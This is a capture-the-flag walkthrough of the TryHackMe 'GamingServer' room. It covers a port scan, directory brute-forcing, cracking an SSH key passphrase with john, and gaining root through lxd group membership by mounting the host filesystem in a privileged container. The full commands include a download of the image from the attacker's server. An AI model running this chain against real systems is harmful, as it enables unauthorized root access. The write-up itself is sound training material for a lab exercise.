# GamingServer

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/80d16a6756c805903806f7ecbdd80f6d.jpeg)

## Difficulty = Easy

***

Running our nmap scan we have -:

```bash
# Nmap 7.94 scan initiated Tue Oct 24 20:04:40 2023 as: nmap -p22,80 -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.215.56
Nmap scan report for 10.10.215.56
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 24 20:05:01 2023 -- 1 IP address (1 host up) scanned in 21.12 seconds
```

Navigating to port `80/HTTP` we have

![](https://i.imgur.com/rNM7tm3.png)

viewing **page-source** we have a username

![](https://i.imgur.com/AmtNMzC.png)


Running dir/file bruteforce with `dirsearch` we have 2 important directories


![](https://i.imgur.com/im9Mygc.png)

Navigating to `/secret` we have an **secretkey** which should be the `id_rsa` key for user **john**

![](https://i.imgur.com/EnWaqzo.png)

Downloading the file via `wget` and trying to log in we can see the **secretkey** file is encrypted which is why we need a passphrase

![](https://i.imgur.com/WDSh1RV.png)

checking `/uploads` on the website we have 3 files

![](https://i.imgur.com/tRM9q4X.png)

`/uploads/dict.lst` looks like a wordlist, we can use this to bruteforce the **secretkey** file

![](https://i.imgur.com/6DJ7yiu.png)

convert the **secretkey** file to a brute forceful file using `ssh2john`

![](https://i.imgur.com/3PA0wkM.png)

Then download the `dict.lst` file with `wget`

```bash
$ wget http://10.10.94.196/uploads/dict.lst
```

Then bruteforce the `id_rsa` file with john using the `dict.lst` file as our wordlist

![](https://i.imgur.com/vUKZoPD.png)

Now we can try to login again via `SSH` with the **secretkey** file and password `letmein`


![](https://i.imgur.com/DWwzxOb.png)

running the `id` command we can see that the **lxd** group is set

![](https://i.imgur.com/4ruV1oe.png)

Return to your attacker machine and run this commands

```bash
# switch user to root
$ sudo su

# download and setup the alpine image
$ git clone  https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ ./build-alpine
```

![](https://i.imgur.com/TAhaoII.png)


Start up your python server and send the `.gzip` compiled alpine image

```bash
# on attacker machine
$ python3 -m http.server 80

# on victim machine
$ cd /tmp
$ wget IP/file.tar.gz
```


![](https://i.imgur.com/umZdCsz.png)

Now on our victim machine run the following command and you should be user **root**

```bash
$ lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
$ lxc image list
$ lxc init myimage ignite -c security.privileged=true
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start ignite
$ lxc exec ignite /bin/sh
```


![](https://i.imgur.com/HnWd6n5.png)

Root flag is located under `/mnt/root/root`

Bankai⚕️

![](https://i.pinimg.com/originals/b8/67/d4/b867d4ed3b8202d73e1f17c8173aeed2.gif)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>


  
